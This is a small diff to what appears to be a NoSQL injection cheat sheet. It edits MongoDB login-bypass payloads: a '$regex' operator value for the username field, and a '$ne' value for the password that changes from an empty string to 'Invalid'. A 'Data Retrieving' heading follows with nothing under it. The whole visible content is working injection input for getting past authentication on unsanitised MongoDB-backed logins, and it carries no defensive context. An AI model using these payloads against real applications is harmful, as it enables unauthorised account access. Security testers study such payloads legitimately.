@@ -1,7 +1,7 @@
 #MongoDB Login Bypass
 
 {"$regex":""} >> For username
-{"$ne":""} >> For password
+{"$ne":"Invalid"} >> For password
 
 #MongoDB Data Retrieving
 
